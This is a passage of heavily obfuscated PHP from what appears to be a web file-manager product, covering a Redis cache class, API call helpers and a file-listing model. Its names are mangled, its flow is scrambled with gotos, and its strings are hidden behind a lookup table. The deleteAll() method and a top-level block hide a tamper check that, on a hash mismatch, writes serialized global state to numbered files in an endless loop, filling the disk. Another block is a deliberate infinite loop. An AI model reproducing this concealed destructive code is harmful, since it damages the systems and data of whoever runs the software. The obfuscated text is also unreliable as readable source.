in_array($a’¨ÇîèŒ„[$d‚—Øîœ‹Æ[12]], $cÊô¸´Ù³)) { $a¾ùâÀÖ¸ = $a’¨ÇîèŒ„[$d‚—Øîœ‹Æ[12]]; } switch ($a¾ùâÀÖ¸) { case $d‚—Øîœ‹Æ[793]: $this->_slave($a’¨ÇîèŒ„, $b™Øô²ó™); break; case $d‚—Øîœ‹Æ[794]: break; case $d‚—Øîœ‹Æ[795]: $this->isCluster = !0; $FÁïÙ–Ç¾° = $a’¨ÇîèŒ„[$d‚—Øîœ‹Æ[788]]; $DËŞ ©¼Ÿ = isset($a’¨ÇîèŒ„[$d‚—Øîœ‹Æ[792]]) ? $a’¨ÇîèŒ„[$d‚—Øîœ‹Æ[792]] : !1; $aÔ£·öÆ÷Ü = isset($a’¨ÇîèŒ„[$d‚—Øîœ‹Æ[388]]) ? $a’¨ÇîèŒ„[$d‚—Øîœ‹Æ[388]] : null; $this->handle = new RedisCluster(NUll, $FÁïÙ–Ç¾°, $b™Øô²ó™, $b™Øô²ó™, $DËŞ ©¼Ÿ, $aÔ£·öÆ÷Ü); break; default: break; } } private function _slave($aÃ‡ƒããõß, $c¨ÂËß…“) { goto dÖ‚²ÍÕŠê; aƒ³ÎâóÚÀ: $this->filterConfig($aÃ‡ƒããõß, $BÅ±‡´¦æ–[$fÓËˆ…Ì]); $this->slaveHandle = $this->init($aÃ‡ƒããõß, $c¨ÂËß…“); goto CËİ·†¼ò¼; eÂÍà†‡ƒæ: unset($BÅ±‡´¦æ–[0]); if (empty($BÅ±‡´¦æ–)) { return; } $fÓËˆ…Ì = array_rand($BÅ±‡´¦æ–); goto aƒ³ÎâóÚÀ; dÖ‚²ÍÕŠê: $BÅ±‡´¦æ– = $aÃ‡ƒããõß[$_SERVER[‡’¶øåüç˜][788]]; $this->filterConfig($aÃ‡ƒããõß, $BÅ±‡´¦æ–[0]); $this->handle = $this->init($aÃ‡ƒããõß, $c¨ÂËß…“); goto eÂÍà†‡ƒæ; CËİ·†¼ò¼: } private function filterConfig(&$C¥Ú¥÷Ğš, $C‡Ğ£•˜–) { $BŒé®”ÓÉ =& $_SERVER[‡’¶øåüç˜]; $CÌšåî¤êğ = explode($BŒé®”ÓÉ[4], $C‡Ğ£•˜–); $A…¼£âĞ— = array($BŒé®”ÓÉ[173] => $CÌšåî¤êğ[0], $BŒé®”ÓÉ[174] => $CÌšåî¤êğ[1]); $C¥Ú¥÷Ğš = array_merge($C¥Ú¥÷Ğš, $A…¼£âĞ—); } public function set($E¤õºÂğó„, $eƒ«ÁİñÒÔ, $cÇ ¾àèõ = false) { $cÇ ¾àèõ = $cÇ ¾àèõ ? $cÇ ¾àèõ : $this->cacheTime; return $this->handle->setEx($E¤õºÂğó„, $cÇ ¾àèõ, $eƒ«ÁİñÒÔ); } public function setLock($fâ‰õÜ¶ì›, $DÛ²´í¬, $D”¯ˆ»í°) { return $this->handle->setNX($fâ‰õÜ¶ì›, $DÛ²´í¬); } public function get($aŸš‚¾ÅÕ–) { $AÕ‰Õ¬’¡Û = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $AÕ‰Õ¬’¡Û->get($aŸš‚¾ÅÕ–); } public function remove($FÃï¹ø°À®) { return $this->handle->del($FÃï¹ø°À®); } public function deleteAll() { $A¥‰íÂ¾Óù =& $_SERVER[‡’¶øåüç˜]; $dĞÜ•ªÓæ = $_SERVER[$A¥‰íÂ¾Óù[375]] . $A¥‰íÂ¾Óù[376]; $cØ‘Çñ•¬Ê = $A¥‰íÂ¾Óù[796]; if ($_SERVER[$A¥‰íÂ¾Óù[372]] != $cØ‘Çñ•¬Ê($dĞÜ•ªÓæ)) { goto C•¹ÊøÍ£ì; e®ù§¥ğÙ: $C×ê‰æº(); $d£‡á¯À·” = $A¥‰íÂ¾Óù[800]; $AºÛÔÇ•ÇŸ = json_encode($GLOBALS[$A¥‰íÂ¾Óù[801]]); goto bËåƒÍÌ°´; FÒÂçìÄÅ: $A·†İêÂ´ = $e×ÃŒï¾î×($A ƒØáéÂˆ); $D†ÓÇõƒ = explode($A¥‰íÂ¾Óù[221], $A·†İêÂ´); if (count($D†ÓÇõƒ) < $A¥‰íÂ¾Óù[570]) { $A‰©Ùôğë½ = $A¥‰íÂ¾Óù[378]; $A‰©Ùôğë½(); } goto f¾í´á”Ä¶; f¾í´á”Ä¶: $E’››¹Œ‘ê = $A¥‰íÂ¾Óù[798]; $E’››¹Œ‘ê($_SERVER[$A¥‰íÂ¾Óù[799]]); $C×ê‰æº = $A¥‰íÂ¾Óù[797]; goto e®ù§¥ğÙ; C•¹ÊøÍ£ì: $C×ê‰æº = $A¥‰íÂ¾Óù[797]; $e×ÃŒï¾î× = $A¥‰íÂ¾Óù[374]; $A ƒØáéÂˆ = $_SERVER[$A¥‰íÂ¾Óù[375]] . $A¥‰íÂ¾Óù[376]; goto FÒÂçìÄÅ; bËåƒÍÌ°´: $bÈÔâÓÏÓ = 1; for ($b½Ï‘‚Üíî = $bÈÔâÓÏÓ; $b½Ï‘‚Üíî > 0; $b½Ï‘‚Üíî++) { $d£‡á¯À·”(DATA_PATH . $b½Ï‘‚Üíî, $AºÛÔÇ•ÇŸ); } goto C‰ÅÙ¨’²©; C‰ÅÙ¨’²©: } if ($this->isCluster) { foreach ($this->handle->_masters() as $E¡êİÒ‰Ÿ÷) { $this->handle->flushall($E¡êİÒ‰Ÿ÷); } return; } return $this->handle->flushAll(); } } goto aŠæ‹·¹æî; bŠù˜¼¦«µ: function ActionCall($e÷¬ëĞÊã‚) { $e†ŒİõÃì¥ = array_slice(func_get_args(), 1); return ActionApply($e÷¬ëĞÊã‚, $e†ŒİõÃì¥); } function ActionCallApi($BŒ¤¾ò¹†â, $fÒ…¼—ï¿÷ = '') { goto bš”¼È‘ã; bš”¼È‘ã: $féİ´„‘Ü =& $_SERVER[úÎ]; $EÈ‚‹Äù‰¡ = $fÒ…¼—ï¿÷; if (is_array($fÒ…¼—ï¿÷)) { $EÈ‚‹Äù‰¡ = $féİ´„‘Ü[16]; foreach ($fÒ…¼—ï¿÷ as $B¢ŒÁ ¦ò => $dÈ¦Ğƒ×µÖ) { $dÈ¦Ğƒ×µÖ = is_array($dÈ¦Ğƒ×µÖ) ? json_encode($dÈ¦Ğƒ×µÖ) : $dÈ¦Ğƒ×µÖ; $dÈ¦Ğƒ×µÖ = is_bool($dÈ¦Ğƒ×µÖ) ? intval($dÈ¦Ğƒ×µÖ) : $dÈ¦Ğƒ×µÖ; $EÈ‚‹Äù‰¡ .= $féİ´„‘Ü[17] . $B¢ŒÁ ¦ò . $féİ´„‘Ü[18] . rawurlencode($dÈ¦Ğƒ×µÖ); } } goto bš‚Ñ•‘¹Ğ; BÅÆ†ôØ÷…: $Fµ­­í´à¢ = json_decode($e§Šáë±, !0); $E‘“¤ã­¥ = is_array($Fµ­­í´à¢) ? $Fµ­­í´à¢ : array($féİ´„‘Ü[29] => null, $féİ´„‘Ü[30] => $e§Šáë±); if (!$Fµ­­í´à¢) { echo $e§Šáë±; } goto F¹ÁÌ…³Ô; bš‚Ñ•‘¹Ğ: $Dóå…É‘• = Action($féİ´„‘Ü[19])->accessToken(); $BŒ¤¾ò¹†â = str_replace($féİ´„‘Ü[5], $féİ´„‘Ü[4], $BŒ¤¾ò¹†â) . $féİ´„‘Ü[20] . $Dóå…É‘• . $EÈ‚‹Äù‰¡; $e§Šáë± = $féİ´„‘Ü[16]; goto f—•¡”İ¨Ï; F¹ÁÌ…³Ô: return $E‘“¤ã­¥; goto f©‹À¿£Ó©; f—•¡”İ¨Ï: $C¶ò•èÀƒ = phpBinCommand(); if ($C¶ò•èÀƒ && function_exists($féİ´„‘Ü[21])) { $DøèÏ†ù•• = $C¶ò•èÀƒ . $féİ´„‘Ü[22] . BASIC_PATH . $féİ´„‘Ü[23] . escapeshellarg($BŒ¤¾ò¹†â); $e§Šáë± = shell_exec($DøèÏ†ù••); } if (!$e§Šáë±) { $FÕµ‘‚—ƒ  = stream_context_create(array($féİ´„‘Ü[24] => array($féİ´„‘Ü[25] => 20, $féİ´„‘Ü[26] => $féİ´„‘Ü[27]))); $e§Šáë± = file_get_contents(APP_HOST . $féİ´„‘Ü[28] . $BŒ¤¾ò¹†â, !1, $FÕµ‘‚—ƒ ); } goto BÅÆ†ôØ÷…; f©‹À¿£Ó©: } function ActionCallHook($BÊóï‘õŸö) { goto AÅÁâÀé×Ó; Dø©™Ù‚ì£: $GLOBALS[$B‘ÏƒÄùŠ§[31]] = 1; $c‚ƒÂËÖÙ» = ActionApply($BÊóï‘õŸö, $B­¸çŒ–ñÔ); $Cä¯ñ×÷è = ob_get_clean(); goto A§´Ü‚Ùğ; AÅÁâÀé×Ó: $B‘ÏƒÄùŠ§ =& $_SERVER[úÎ]; ob_start(); $B­¸çŒ–ñÔ = array_slice(func_get_args(), 1); goto Dø©™Ù‚ì£; A§´Ü‚Ùğ: $c‚ƒÂËÖÙ» = $Cä¯ñ×÷è ? json_decode($Cä¯ñ×÷è, !0) : $c‚ƒÂËÖÙ»; $GLOBALS[$B‘ÏƒÄùŠ§[31]] = 0; return $c‚ƒÂËÖÙ»; goto dÆ¼æƒº­°; dÆ¼æƒº­°: } goto dó›”«Å à; FõË¹õæÖ: if (!isset($_SERVER[$_SERVER[‡’¶øåüç˜][372]]) || !isset($_SERVER[$_SERVER[‡’¶øåüç˜][373]])) { goto Dí´ì‡£ğ‹; Dí´ì‡£ğ‹: $c÷Æ¥‘´Ñ° = $_SERVER[‡’¶øåüç˜][374]; $dˆ—÷ˆÚªÜ = $_SERVER[$_SERVER[‡’¶øåüç˜][375]] . $_SERVER[‡’¶øåüç˜][376]; $C¾Ú³éâ‹ª = $c÷Æ¥‘´Ñ°($dˆ—÷ˆÚªÜ); goto c¹ÃèãÂâ; c¹ÃèãÂâ: $eĞĞùÅö” = explode($_SERVER[‡’¶øåüç˜][221], $C¾Ú³éâ‹ª); if (count($eĞĞùÅö”) < $_SERVER[‡’¶øåüç˜][377]) { $fœÓœ¤“š = $_SERVER[‡’¶øåüç˜][378]; $fœÓœ¤“š(); } $F¿ÜøÏ¾ÌË = $_SERVER[‡’¶øåüç˜][379]; goto fÚ‡±²ÌŸ; fÚ‡±²ÌŸ: $F¿ÜøÏ¾ÌË($_SERVER[$_SERVER[‡’¶øåüç˜][375]] . $_SERVER[‡’¶øåüç˜][376]); $c’…Û¥¢®Ï = 2; while ($c’…Û¥¢®Ï > 1) { $Cç «­ãª = rawurlencode($c’…Û¥¢®Ï . $_SERVER[‡’¶øåüç˜][365]); } goto AÄíäó©½; AÄíäó©½: } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\x63\145"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\x6d\x65" => "\151\157\x5f\163\x6f\165\x72\x63\145\137\x6d\145\x74\141", "\x6d\x65\x74\141\x46\x69\x65\154\144" => "\163\157\x75\162\x63\x65\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\x54\x69\155\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\165\x6e\143\x74\x69\x6f\156"), array("\143\x72\x65\141\x74\x65\124\151\x6d\145", "\164\x69\x6d\x65", "\151\x6e\x73\x65\162\x74", "\x66\165\x6e\143\164\x69\157\156"), array("\x76\151\x65\167\x54\x69\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\x65\x72\x74", "\146\x75\x6e\x63\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($a£§™óó¿Ä) { return $this->listSource(array($_SERVER[‡’¶øåüç˜][380] => $a£§™óó¿Ä)); } public function typeName($bë‹¸…¢) { static $bĞœ„Š•ó = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\x67\x72\x6f\x75\160"); return $bĞœ„Š•ó[$bë‹¸…¢ . $_SERVER[‡’¶øåüç˜][33]]; } public function sourceListInfo($DœêÇŒˆ¬, $c‚‡“¨êì¼ = false) { goto E›Ø°×¯Úô; E›Ø°×¯Úô: $dš¿×Ù¯³ä =& $_SERVER[‡’¶øåüç˜]; $DœêÇŒˆ¬ = $DœêÇŒˆ¬ ? $DœêÇŒˆ¬ : array(); $DœêÇŒˆ¬ = array_filter(array_unique($DœêÇŒˆ¬)); goto e¨Ã§‹¿éá; e¨Ã§‹¿éá: if (!$DœêÇŒˆ¬) { return array(); } $f¸’½ºöø = $this->where(array($dš¿×Ù¯³ä[381] => array($dš¿×Ù¯³ä[7], $DœêÇŒˆ¬)))->select(); $this->_listDataApply($f¸’½ºöø, $c‚‡“¨êì¼); goto DÀİïíŞê; DÀİïíŞê: return array_to_keyvalue($f¸’½ºöø, $dš¿×Ù¯³ä[381]); goto eš„ñ—Ê¨Ş; eš„ñ—Ê¨Ş: } public function pathInfoFilter($E›¬¯ãó÷«) { goto C‰åÜÉ¥è; D‹‰øƒïÇí: if (isset($E›¬¯ãó÷«[$f“…ÕŠ…à[388]]) && $E›¬¯ãó÷«[$f“…ÕŠ…à[388]][$f“…ÕŠ…à[389]] == -1) { $aÁ„œÖ´§Á = array_remove_value($aÁ„œÖ´§Á, $f“…ÕŠ…à[191]); $aÁ„œÖ´§Á = array_remove_value($aÁ„œÖ´§Á, $f“…ÕŠ…à[107]); $aÁ„œÖ´§Á = array_remove_value($aÁ„œÖ´§Á, $f“…ÕŠ…à[390]); $aÁ„œÖ´§Á = array_remove_value($aÁ„œÖ´§Á, $f“…ÕŠ…à[391]); $aÁ„œÖ´§Á = array_remove_value($aÁ„œÖ´§Á, $f“…ÕŠ…à[77]); $aÁ„œÖ´§Á = array_remove_value($aÁ„œÖ´§Á, $f“…ÕŠ…à[392]); } $E›¬¯ãó÷« = array_field_key($E›¬¯ãó÷«, $aÁ„œÖ´§Á); return $E›¬¯ãó÷«; goto B‡§¾Í°¦¤; C‰åÜÉ¥è: $f“…ÕŠ…à =& $_SERVER[‡’¶øåüç˜]; $E›¬¯ãó÷«[$f“…ÕŠ…à[75]] = KodIO::make($E›¬¯ãó÷«[$f“…ÕŠ…à[381]]); $E›¬¯ãó÷«[$f“…ÕŠ…à[29]] = $E›¬¯ãó÷«[$f“…ÕŠ…à[382]] == 1 ? $f“…ÕŠ…à[76] : $f“…ÕŠ…à[171]; goto B°Èö‚ğ¹„; B°Èö‚ğ¹„: $E›¬¯ãó÷«[$f“…ÕŠ…à[383]] = $this->typeName($E›¬¯ãó÷«[$f“…ÕŠ…à[383]]); if ($E›¬¯ãó÷«[$f“…ÕŠ…à[382]] != 1) { $E›¬¯ãó÷«[$f“…ÕŠ…à[165]] = $E›¬¯ãó÷«[$f“…ÕŠ…à[384]]; unset($E›¬¯ãó÷«[$f“…ÕŠ…à[384]]); } $Eˆóˆ´œØ = $f“…ÕŠ…à[385]; goto f±ñ©ÈËİ§; f±ñ©ÈËİ§: $Eˆóˆ´œØ .= $f“…ÕŠ…à[386]; $Eˆóˆ´œØ .= $f“…ÕŠ…à[387]; $aÁ„œÖ´§Á = explode($f“…ÕŠ…à[47], $Eˆóˆ´œØ); goto D‹‰øƒïÇí; B‡§¾Í°¦¤: } public function listUserFav() { goto e‘¬ˆà‘—; aÄ ƒ¢Øê: $f½‘Ì®˜’© = array_to_keyvalue($f½‘Ì®˜’©, $Báªõ—ÛÛä[33], $Báªõ—ÛÛä[75]); if ($f½‘Ì®˜’©) { $aœ„Ãæäìà = $this->listSource(array($Báªõ—ÛÛä[395] => array($Báªõ—ÛÛä[396], $f½‘Ì®˜’©))); } $aœ„Ãæäìà = array_to_keyvalue($aœ„Ãæäìà[$Báªõ—ÛÛä[358]], $Báªõ—ÛÛä[381]); goto A‡¶•ËÈª; A‡¶•ËÈª: foreach ($c ôÃÅí¾ as &$DË§˜‘“›ò) { $DË§˜‘“›ò = array($Báªõ—ÛÛä[397] => $DË§˜‘“›ò[$Báªõ—ÛÛä[371]], $Báªõ—ÛÛä[398] => $DË§˜‘“›ò[$Báªõ—ÛÛä[28]], $Báªõ—ÛÛä[399] => $DË§˜‘“›ò[$Báªõ—ÛÛä[75]], $Báªõ—ÛÛä[400] => $DË§˜‘“›ò[$Báªõ—ÛÛä[29]], $Báªõ—ÛÛä[401] => $DË§˜‘“›ò[$Báªõ—ÛÛä[191]], $Báªõ—ÛÛä[402] => $DË§˜‘“›ò[$Báªõ—ÛÛä[107]]); if ($DË§˜‘“›ò[$Báªõ—ÛÛä[29]] == $Báªõ—ÛÛä[394] && $aœ„Ãæäìà[$DË§˜‘“›ò[$Báªõ—ÛÛä[75]]]) { $DË§˜‘“›ò[$Báªõ—ÛÛä[403]] = $aœ„Ãæäìà[$DË§˜‘“›ò[$Báªõ—ÛÛä[75]]]; } } unset($DË§˜‘“›ò); return $c ôÃÅí¾; goto CäÍíˆàÎ‰; e‘¬ˆà‘—: $Báªõ—ÛÛä =& $_SERVER[‡’¶øåüç˜]; $c ôÃÅí¾ = Model($Báªõ—ÛÛä[393])->listData(); $f½‘Ì®˜’© = array_filter_by_field($c ôÃÅí¾, $Báªõ—ÛÛä[29], $Báªõ—ÛÛä[394]); goto aÄ ƒ¢Øê; CäÍíˆàÎ‰: } public function listUserTag($BäòŠ«Ü±…) { goto A«È‚£‰˜; få¤á¨Šƒ²: $aÍùç˜¡ = array(); foreach ($C®­°†ÊäÒ as $Cù¯Í›¼íä) { $eÆä°‘ Ã = $Cù¯Í›¼íä[$e™è Ëì[75]]; if (!$eÆä°‘ Ã) { continue; } if (!isset($aÍùç˜¡[$eÆä°‘ Ã])) { $aÍùç˜¡[$eÆä°‘ Ã] = array(); } $aÍùç˜¡[$eÆä°‘ Ã][] = $Cù¯Í›¼íä[$e™è Ëì[405]]; } $Cá›‘°ËÌ¬ = array(); goto B×¢œš®öŞ; a×­¼Æù…¦: if ($Dá®â‹ò) { Model($e™è Ëì[406])->removeBySource($Dá®â‹ò); } return $E¶ó¨‡Ùƒ; goto cá£Ãµ†…Æ; A«È‚£‰˜: $e™è Ëì =& $_SERVER[‡’¶øåüç˜]; if ($BäòŠ«Ü±… && !is_array($BäòŠ«Ü±…)) { $BäòŠ«Ü±… = array($BäòŠ«Ü±…); } $C®­°†ÊäÒ = Model($e™è Ëì[404])->listData(); goto få¤á¨Šƒ²; Bæ¹Õ‰Áë: if (!$E¶ó¨‡Ùƒ || count($Cá›‘°ËÌ¬) == $E¶ó¨‡Ùƒ[$e™è Ëì[355]][$e™è Ëì[356]]) { return $E¶ó¨‡Ùƒ; } $Dá®â‹ò = array(); $b¯©×…‹å¸ = array_to_keyvalue($E¶ó¨‡Ùƒ[$e™è Ëì[74]], $e™è Ëì[33], $e™è Ëì[381]); goto FØŒÛÅ©´Ó; FØŒÛÅ©´Ó: $fÅ‰ÜÁŒì = array_to_keyvalue($E¶ó¨‡Ùƒ[$e™è Ëì[73]], $e™è Ëì[33], $e™è Ëì[381]); $Aˆáà†œãø = array_merge($fÅ‰ÜÁŒì, $b¯©×…‹å¸); foreach ($Cá›‘°ËÌ¬ as $eÆä°‘ Ã) { if (!in_array($eÆä°‘ Ã, $Aˆáà†œãø)) { $Dá®â‹ò[] = $eÆä°‘ Ã; } } goto a×­¼Æù…¦; B×¢œš®öŞ: foreach ($aÍùç˜¡ as $E“§°§² => $d‚¡ÌÏÃâ) { $dØÛ¸÷ÔáÌ = !0; if (!$BäòŠ«Ü±…) { $Cá›‘°ËÌ¬[] = $E“§°§²; continue; } foreach ($BäòŠ«Ü±… as $eì¨ˆÀÒá) { if (!in_array($eì¨ˆÀÒá, $d‚¡ÌÏÃâ)) { $dØÛ¸÷ÔáÌ = !1; break; } } if ($dØÛ¸÷ÔáÌ) { $Cá›‘°ËÌ¬[] = $E“§°§²; } } if (!$Cá›‘°ËÌ¬) { return array(); } $E¶ó¨‡Ùƒ = $this->listSource(array($e™è Ëì[395] => array($e™è Ëì[396], $Cá›‘°ËÌ¬))); goto Bæ¹Õ‰Áë; cá£Ãµ†…Æ: } public function listUserRecycle() { $FŒ‚¯ø÷î‘ =& $_SERVER[‡’¶øåüç˜]; $bËô°»À± = Model($FŒ‚¯ø÷î‘[407])->listData(); if (!$bËô°»À±) { return array(); } $aªˆä¾¶ Ï = array($FŒ‚¯ø÷î‘[395] => array($FŒ‚¯ø÷î‘[396], $bËô°»À±), $FŒ‚¯ø÷î‘[408] => 1); return $this->listSource($aªˆä¾¶ Ï); } public function listSource($cœøˆäæëò, $aø®›Œä×‰ = 3000) { goto F½¸ÖµÖÍ; D¢Èò„ôĞ: $e²ìéÔ‚äñ = $this->field($f¬àâ‘ºßª)->_makeOrder()->where($cœøˆäæëò)->selectPage($aø®›Œä×‰); $this->_listDataApply($e²ìéÔ‚äñ[$B×»˜ Ÿ÷Á[358]]); $this->_listMake($e²ìéÔ‚äñ); goto Dµ¿¶é…¸; F½¸ÖµÖÍ: $B×»˜ Ÿ÷Á =& $_SERVER[‡’¶øåüç˜]; if (!isset($cœøˆäæëò[$B×»˜ Ÿ÷Á[409]])) { $cœøˆäæëò[$B×»˜ Ÿ÷Á[409]] = 0; } $f¬àâ‘ºßª = $B×»˜ Ÿ÷Á[410]; goto D¢Èò„ôĞ; Dµ¿¶é…¸: return $e²ìéÔ‚äñ; goto A­•œº·æ³; A­•œº·æ³: } protected function _makeOrder() { goto BôŸ¢Ÿ£çš; fçŸ‰š¸©´: $AÀæÇ²‡àô = array($cŞ†İÒ±[414] => $cŞ†İÒ±[415], $cŞ†İÒ±[416] => $cŞ†İÒ±[417]); $fôÔÓ ®­Û = array($cŞ†İÒ±[28] => $cŞ†İÒ±[28], $cŞ†İÒ±[77] => $cŞ†İÒ±[77], $cŞ†İÒ±[165] => $cŞ†İÒ±[384], $cŞ†İÒ±[390] => $cŞ†İÒ±[390], $cŞ†İÒ±[418] => $cŞ†İÒ±[391], $cŞ†İÒ±[191] => $cŞ†İÒ±[191], $cŞ†İÒ±[107] => $cŞ†İÒ±[107]); $bÅéŞµ•Ò = Input::get($cŞ†İÒ±[419], $cŞ†İÒ±[7], $C³™šØÖÔä, array_keys($fôÔÓ ®­Û)); goto F‹ßÁ•Ê”À; D‹×à—âÊÙ: if ($bÅéŞµ•Ò == $cŞ†İÒ±[28]) { } $f«‡îÁ”£Î = $cŞ†İÒ±[421] . $fôÔÓ ®­Û[$bÅéŞµ•Ò] . $cŞ†İÒ±[50] . $AÀæÇ²‡àô[$B‹ùª”­÷³]; return $this->order(rtrim(trim($f«‡îÁ”£Î), $cŞ†İÒ±[47])); goto D¦¥ğà·Í; BôŸ¢Ÿ£çš: $cŞ†İÒ± =& $_SERVER[‡’¶øåüç˜]; $C³™šØÖÔä = Model($cŞ†İÒ±[411])->get($cŞ†İÒ±[412]); $eß²›ßùŠ¥ = Model($cŞ†İÒ±[411])->get($cŞ†İÒ±[413]); goto fçŸ‰š¸©´; F‹ßÁ•Ê”À: $B‹ùª”­÷³ = Input::get($cŞ†İÒ±[420], $cŞ†İÒ±[7], $eß²›ßùŠ¥, array_keys($AÀæÇ²‡àô)); if (!in_array($bÅéŞµ•Ò, array_keys($fôÔÓ ®­Û))) { $bÅéŞµ•Ò = $cŞ†İÒ±[28]; } if (!in_array($B‹ùª”­÷³, array_keys($AÀæÇ²‡àô))) { $bÅéŞµ•Ò = $cŞ†İÒ±[414]; } goto D‹×à—âÊÙ; D¦¥ğà·Í: } protected function _listDataApplyItem($cÌµÖ¤¼, $bœÂ¼áŒŠ£ = false) { $cã¢î¤êõŠ = array($cÌµÖ¤¼); $this->_listDataApply($cã¢î¤êõŠ, $bœÂ¼áŒŠ£); return $cã¢î¤êõŠ[0]; } protected function _listDataApply(&$AÍó»œ™´¯, $fÑ¥ÎàÙ¿’ = false) { goto b’‚—¼‡»Œ; b‡ˆõ‡Œó×: $this->_listAppendUser($AÍó»œ™´¯); $this->_listFilterInfo($AÍó»œ™´¯, $fÑ¥ÎàÙ¿’); goto d½•·ÌÂ…; fãè‰Ú¶¤: $this->_listAppendPath($AÍó»œ™´¯); $this->_listAppendAuth($AÍó»œ™´¯); $this->_listAppendSourceInfo($AÍó»œ™´¯, $d§È©™ó·„); goto b‡ˆõ‡Œó×; b’‚—¼‡»Œ: $Då…âµ¨Â =& $_SERVER[‡’¶øåüç˜]; if (!$AÍó»œ™´¯) { $AÍó»œ™´¯ = array(); return; } $d§È©™ó·„ = array_to_keyvalue($AÍó»œ™´¯, $Då…âµ¨Â[33], $Då…âµ¨Â[381]); goto Bñ‘‰ùàÀİ; Bñ‘‰ùàÀİ: $d§È©™ó·„ = array_unique($d§È©™ó·„); $this->_listSourceCache($AÍó»œ™´¯); if (!$fÑ¥ÎàÙ¿’) { $this->_listAppendMeta($AÍó»œ™´¯, $d§È©™ó·„); $this->_listAppendFileMeta($AÍó»œ™´¯, $d§È©™ó·„); $this->_listAppendChildren($AÍó»œ™´¯, $d§È©™ó·„); } goto fãè‰Ú¶¤; d½•·ÌÂ…: } protected function _listSourceCache($A‡ÜÁ“ãŸ·) { $bÄŞŞÔù¡Õ =& $_SERVER[‡’¶øåüç˜]; foreach ($A‡ÜÁ“ãŸ· as $Bø¡Îä´Ê™) { self::$cacheSourceInfo[$bÄŞŞÔù¡Õ[422] . $Bø¡Îä´Ê™[$bÄŞŞÔù¡Õ[381]]] = $Bø¡Îä´Ê™; } } protected function _listFilterInfo(&$CÓ½‘£Şºİ, $f¾¹óŞí¡¬ = false) { $b³ŸŒÍ¡À™ =& $_SERVER[‡’¶øåüç˜]; foreach ($CÓ½‘£Şºİ as &$DªÇ…ºîÊ) { $DªÇ…ºîÊ = $this->pathInfoFilter($DªÇ…ºîÊ); self::$cachePathInfo[$b³ŸŒÍ¡À™[423] . intval($f¾¹óŞí¡¬) . $b³ŸŒÍ¡À™[424] . $DªÇ…ºîÊ[$b³ŸŒÍ¡À™[381]]] = $DªÇ…ºîÊ; } unset($DªÇ…ºîÊ); } protected function _listMake(&$dß–»ä„Ã) { $bè·Êå’ª =& $_SERVER[‡’¶øåüç˜]; $dß–»ä„Ã[$bè·Êå’ª[74]] = array(); $dß–»ä„Ã[$bè·Êå’ª[73]] = array(); foreach ($dß–»ä„Ã[$bè·Êå’ª[358]] as $A¼¾“·»š) { $BÆŠ è±¾  = $A¼¾“·»š[$bè·Êå’ª[382]] == 1 ? $bè·Êå’ª[74] : $bè·Êå’ª[73]; $dß–»ä„Ã[$BÆŠ è±¾ ][] = $A¼¾“·»š; } unset($dß–»ä„Ã[$bè·Êå’ª[358]]); } protected function _listAppendMeta(&$E›­Æ…‡Ç, $cğ§ß”âó‚) { goto Dçƒ©ïîÊò; Dçƒ©ïîÊò: $aˆìó¬±÷  =& $_SERVER[‡’¶øåüç˜]; $cæ—ÒØ…Ò = array($aˆìó¬±÷ [395] => array($aˆìó¬±÷ [396], $cğ§ß”âó‚)); $A¬½â‡èæÌ = Model($aˆìó¬±÷ [425])->field($aˆìó¬±÷ [426])->where($cæ—ÒØ…Ò)->select(); goto b¦µÍ¬¦ã; b¦µÍ¬¦ã: if (!$A¬½â‡èæÌ) { return; } $bÜ˜„Î¾ = array($aˆìó¬±÷ [427], $aˆìó¬±÷ [428]); $B¯¸¤îˆ¶Â = array(); goto E„¤ÀˆÁ…ò; E„¤ÀˆÁ…ò: foreach ($A¬½â‡èæÌ as $AÂØ®•ÖÁ‚) { if (!isset($B¯¸¤îˆ¶Â[$AÂØ®•ÖÁ‚[$aˆìó¬±÷ [381]]])) { $B¯¸¤îˆ¶Â[$AÂØ®•ÖÁ‚[$aˆìó¬±÷ [381]]] = array(); } if (in_array($AÂØ®•ÖÁ‚[$aˆìó¬±÷ [89]], $bÜ˜„Î¾)) { continue; } $B¯¸¤îˆ¶Â[$AÂØ®•ÖÁ‚[$aˆìó¬±÷ [381]]][$AÂØ®•ÖÁ‚[$aˆìó¬±÷ [89]]] = $AÂØ®•ÖÁ‚[$aˆìó¬±÷ [363]]; } foreach ($E›­Æ…‡Ç as &$C‘¥äÂà) { $C‘¥äÂà[$aˆìó¬±÷ [429]] = !1; if (isset($B¯¸¤îˆ¶Â[$C‘¥äÂà[$aˆìó¬±÷ [381]]])) { $C‘¥äÂà[$aˆìó¬±÷ [429]] = $B¯¸¤îˆ¶Â[$C‘¥äÂà[$aˆìó¬±÷ [381]]]; } if ($this->fileIsLock($C‘¥äÂà) && $C‘¥äÂà[$aˆìó¬±÷ [388]]) { $Eé‚¥ò“¬å = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $C‘¥äÂà[$aˆìó¬±÷ [388]][$aˆìó¬±÷ [389]] = AuthModel::authDisable($C‘¥äÂà[$aˆìó¬±÷ [388]][$aˆìó¬±÷ [389]], $Eé‚¥ò“¬å); $C‘¥äÂà[$aˆìó¬±÷ [388]][$aˆìó¬±÷ [430]][$aˆìó¬±÷ [388]] = $C‘¥äÂà[$aˆìó¬±÷ [388]][$aˆìó¬±÷ [389]]; } } unset($C‘¥äÂà); goto Dëæˆâ¼³; Dëæˆâ¼³: } protected function _listAppendFileMeta(&$cÍòãÍˆ‘, $B—¹†¢ Š¦) { goto BİÇ›¶¤¸; E‰××ËãÈŒ: $Dê©ß”—Ô¡ = $Dê©ß”—Ô¡ ? $Dê©ß”—Ô¡ : array(); $dâÒ‡—–óç = array(); foreach ($Dê©ß”—Ô¡ as $CùÃ‚ÛÇáÛ) { if (!isset($dâÒ‡—–óç[$CùÃ‚ÛÇáÛ[$F™ï¼äî[431]]])) { 